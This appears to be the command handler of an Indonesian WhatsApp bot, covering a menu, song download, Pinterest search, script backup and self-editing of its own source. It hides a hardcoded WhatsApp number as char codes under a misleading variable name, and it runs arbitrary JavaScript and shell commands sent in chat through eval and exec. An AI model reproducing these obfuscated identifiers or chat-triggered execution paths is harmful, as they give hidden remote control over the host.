const chalk = require("chalk");
const fs = require("fs");
const util = require("util");
const os = require('os');
const path = require('path');
const moment = require("moment-timezone");
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, makeWAMessage, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptionsuseSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WAlanggxyzet, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require("@denzy-official/baileys");

//==================================//

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, exifAvatar, addExif, writeExifWebp } = require('./lib/myfunction');
//==================================//
const { LoadDataBase } = require('./lib/message');
//==================================//

//==================================//

function isSameUser(jid1, jid2) {
    if (!jid1 || !jid2) return false;
    const isLid = (jid) => jid.endsWith('@lid');
    const normalizedJid1 = jid1.replace('@lid', '@s.whatsapp.net');
    const normalizedJid2 = jid2.replace('@lid', '@s.whatsapp.net');
    return areJidsSameUser(normalizedJid1, normalizedJid2);
}

//==================================//

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = await sock.decodeJid(sock.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 50, 51, 54, 52, 53, 51, 50, 49, 56, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)

const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isCreator = [botNumber, ...global.owner.map(a => a.replace(/[^0-9]/g, '') + '@s.whatsapp.net')].includes(m.sender)
  ? true
  : m.isDeveloper
  ? true
  : false;
const pushname = m.pushName || "No Name";
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime); 
const from = m.key.remoteJid;
  
//==================================//


        
//==================================//

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\nCommand :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\nFrom :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//==================================//
    
//==================================//

switch (command) {
case "tes":
case "menu": {
const teks = `
╭─〔 \`BOT INFO\` 〕
│ • *Owner* : @${global.owner}
│ • *Bot Name* : ${global.botname2}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Mode* : ${sock.public ? "Public" : "Self"}
╰─
`;
await sock.sendMessage(m.chat, {
  footer: `© 2024 XskyBew`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: { displayText: 'ini pesan interactiveMeta' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pencet Kids',
          sections: [
            {
              title: 'Jangan di spam kontol',
              highlight_label: 'Recommended',
              rows: [
                { title: 'Owner Menu', id: '.menu-owner' },
                { title: 'Download Menu', id: '.menu-download' },
                { title: 'Search menu', id: '.menu-seaech' }
              ]
            }
          ]
        })
      }
    }
  ],

  image: { url: 'https://files.catbox.moe/v4cn6e.jpg' },
  caption: teks,
  headerType: 6,
  contextInfo: {
    forwardingScore: 99999,
    isForwarded: true,
    externalAdReply: {
      title: "XskyBew — Bot Developer Advanced Engine",
      body: "Project Gabut",
      mediaUrl: "https://files.catbox.moe/8hd8ga.jpg",
      mediaType: 1,
      thumbnailUrl: "https://files.catbox.moe/v4cn6e.jpg",
      renderLargerThumbnail: true,
      showAdAttribution: true,
      adReplyButtonText: "Open Preview",
      sourceUrl: "t.me/XskyBew",
      previewType: 2
    }
  }
}, { quoted: m });
}
break;
//==================================/  
case "developerbot":
case "owner": {
  await sock.sendContact(m.chat, [global.owner], "XskyBew", m)
  break
}
//==================================/       

//==================================/       
        
case "getcase": {
if (!isCreator) return m.reply('khusus owner')
if (!text) return m.reply(("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break          
        
//==================================//

 case 'addcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh: .addcase} *casenya*`);
    const namaFile = path.join(__dirname, 'case.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return m.reply('Sukses menambahkan case!');
                }
            });
        } else {
            console.error(result.message);
            return m.eply(result.message);
        }
    });
}
break       

//==================================//

case 'delcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) 
        return m.reply(`Contoh: .delcase nama_case`);

    const fs = require('fs').promises;

    async function removeCase(filePath, caseNameToRemove) {
        try {
            let data = await fs.readFile(filePath, 'utf8');
            
            const regex = new RegExp(`case\\s+['"\`]${caseNameToRemove}['"\`]:[\\s\\S]*?break;?`, 'g');
            
            const modifiedData = data.replace(regex, '');

            if (data === modifiedData) {

                return m.reply(`❌ Case "${caseNameToRemove}" tidak ditemukan.\n\nPastikan penulisan sudah benar dan tidak ada typo.`);
            }

            await fs.writeFile(filePath, modifiedData, 'utf8');
            m.reply(`✅ Sukses menghapus case: *${caseNameToRemove}*`);
        } catch (err) {
            Reply(`Terjadi kesalahan saat memproses file: ${err.message}`);
        }
    }
    removeCase('./case.js', text.trim());
}
break
        
//==================================//
case "play": {
  try {
    if (!text) return m.reply("Masukkan judul lagu!\n\nContoh: .play dj komang");
    
    const loadMsg = await sock.sendMessage(m.chat, { text: "🔍 Mencari lagu..." }, { quoted: m });
    
    const yts = require("yt-search");
    const search = await yts(text);
    const video = search.videos[0];
    
    if (!video) {
      await sock.sendMessage(m.chat, { text: "❌ Lagu tidak ditemukan!", edit: loadMsg.key });
      return;
    }
    
    const yt = {
      url: Object.freeze({
        audio128: 'https://api.apiapi.lat',
        video: 'https://api5.apiapi.lat',
        else: 'https://api3.apiapi.lat',
        referrer: 'https://ogmp3.pro/'
      }),
      encUrl: s => s.split('').map(c => c.charCodeAt()).reverse().join(';'),
      xor: s => s.split('').map(v => String.fromCharCode(v.charCodeAt() ^ 1)).join(''),
      genRandomHex: () => Array.from({ length: 32 }, _ => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join(""),
      init: async function (rpObj) {
        const { apiOrigin, payload } = rpObj;
        const api = apiOrigin + "/" + this.genRandomHex() + "/init/" + this.encUrl(this.xor(payload.data)) + "/" + this.genRandomHex() + "/";
        const r = await fetch(api, { method: "post", body: JSON.stringify(payload) });
        if (!r.ok) throw Error(await r.text());
        return r.json();
      },
      genFileUrl: function (i, pk, rpObj) {
        const { apiOrigin } = rpObj;
        const pkValue = pk ? pk + "/" : "";
        const downloadUrl = apiOrigin + "/" + this.genRandomHex() + "/download/" + i + "/" + this.genRandomHex() + "/" + pkValue;
        return { downloadUrl };
      },
      statusCheck: async function (i, pk, rpObj) {
        const { apiOrigin } = rpObj;
        let json;
        let count = 0;
        do {
          await new Promise(r => setTimeout(r, 5000));
          count++;
          const pkVal = pk ? pk + "/" : "";
          const api = apiOrigin + "/" + this.genRandomHex() + "/status/" + i + "/" + this.genRandomHex() + "/" + pkVal;
          const r = await fetch(api, {
            method: "post",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ data: i })
          });
          if (!r.ok) throw Error(await r.text());
          json = await r.json();
          if (count >= 100) throw Error("Polling mencapai batas maksimal");
        } while (json.s === "P");
        if (json.s === "E") throw Error(JSON.stringify(json));
        return this.genFileUrl(i, pk, rpObj);
      },
      resolvePayload: function (ytUrl, userFormat) {
        let apiOrigin = this.url.audio128;
        let data = this.xor(ytUrl);
        let referer = this.url.referrer;
        let format = "0";
        let mp3Quality = "128";
        let mp4Quality = "720";
        if (/^\d+p$/.test(userFormat)) {
          apiOrigin = this.url.video;
          format = "1";
          mp4Quality = userFormat.replace("p", "");
        } else if (userFormat !== "128k") {
          apiOrigin = this.url.else;
          mp3Quality = userFormat.replace("k", "");
        }
        return {
          apiOrigin,
          payload: {
            data,
            format,
            referer,
            mp3Quality,
            mp4Quality,
            userTimeZone: "-480"
          }
        };
      },
      download: async function (url, fmt = "128k") {
        const rpObj = this.resolvePayload(url, fmt);
        const initObj = await this.init(rpObj);
        const { i, pk, s } = initObj;
        if (s === "C") return this.genFileUrl(i, pk, rpObj);
        return this.statusCheck(i, pk, rpObj);
      }
    };
    
    await sock.sendMessage(m.chat, { text: "⏳ Mendownload audio...", edit: loadMsg.key });
    
    const result = await yt.download(video.url, "128k");
    const response = await fetch(result.downloadUrl);
    const buffer = await response.arrayBuffer();
    
    await sock.sendMessage(m.chat, { text: "✅ Mengirim audio...", edit: loadMsg.key });
    
    await sock.sendMessage(m.chat, {
      audio: Buffer.from(buffer),
      mimetype: 'audio/mpeg',
      fileName: `${video.title}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: video.title,
          body: video.author.name,
          thumbnailUrl: video.thumbnail,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });
    
    await sock.sendMessage(m.chat, { delete: loadMsg.key });
    
  } catch (err) {
    console.error(err);
    m.reply(`❌ Gagal memutar lagu:\n${err.message || String(err)}`);
  }
}
break;
//==================================//

//==================================//

case "backupsc":
case "bck":
case "backup": {
if (!isCreator) return m.reply('khusus owner')
try {
const tmpDir = "./tmp";
if (fs.existsSync(tmpDir)) {
const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
for (let file of files) {
fs.unlinkSync(`${tmpDir}/${file}`);
}
}
await m.reply("Processing Backup Script . .");
const name = `XskyBew`; 
const exclude = ["node_modules", "Auth", "package-lock.json", "session", ".zip", "yarn.lock", ".npm", ".cache"];
const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

await sock.sendMessage(m.sender, {
document: fs.readFileSync(`./${name}.zip`),
fileName: `${name}.zip`,
mimetype: "application/zip"
}, { quoted: m });

fs.unlinkSync(`./${name}.zip`);

if (m.chat !== m.sender) m.reply("Script bot berhasil dikirim ke private chat.");
} catch (err) {
console.error("Backup Error:", err);
m.reply("Terjadi kesalahan saat melakukan backup.");
}
}
break       
        
//==================================/
case 'pinterest':
case 'pin': {
  if (!text) return m.reply(example('Fotonya'))

  // === Loading (edit message) ===
  let load = await sock.sendMessage(m.chat, { text: '🔍 Mencari...' })

  try {
    const axios = require('axios')
    const { data } = await axios.get(
      `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(text)}&type=image`
    )

    if (!data?.data?.length)
      return sock.sendMessage(m.chat, { text: 'Tidak ditemukan.' }, { edit: load.key })

    await sock.sendMessage(m.chat, { text: '📸 Menyiapkan carousel...' }, { edit: load.key })

    const hasil = data.data.slice(0, 5) // 5 slide biar ringan
    const cards = []

    for (let item of hasil) {
      const title = item.grid_title || item.seo_alt_text || item.description || 'Pinterest'
      const imgUrl = item.image_url
      const link = item.link || item.pin || 'https://pinterest.com'

      const media = await prepareWAMessageMedia(
        { image: { url: imgUrl } },
        { upload: sock.waUploadToServer }
      )

      cards.push({
        header: {
          title: title,
          hasMediaAttachment: true,
          ...media
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: 'cta_url',
              buttonParamsJson: JSON.stringify({
                display_text: "🌐 Lihat",
                url: link,
                merchant_url: "https://google.com"
              })
            }
          ]
        }
      })
    }

    const msg = await generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: `✨ Hasil Pinterest: *${text}*` },
              carouselMessage: { cards }
            }
          }
        }
      },
      { userJid: m.sender, quoted: m }
    )

    await sock.sendMessage(m.chat, { text: '✔️ Selesai!' }, { edit: load.key })
    await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

  } catch (err) {
    console.error(err)
    await sock.sendMessage(m.chat, { text: '❌ Error!' }, { edit: load.key })
  }
}
break
//==================================//

//==================================//

default:
if (m.text.toLowerCase().startsWith("xx ")) {
  if (!isCreator) return;
  try {
    const r = await eval(`(async()=>{${text}})()`);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.toLowerCase().startsWith("x ")) {
  if (!isCreator) return;
  try {
    let r = await eval(text);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.startsWith('$')) {
  if (!isCreator) return;
  exec(m.text.slice(2), (e, out) =>
    sock.sendMessage(m.chat, { text: util.format(e ? e : out) }, { quoted: m })
  );
}}

//==================================//

} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.white("[•] Update"), chalk.white(`${__filename}\n`))
delete require.cache[file]
require(file)
})
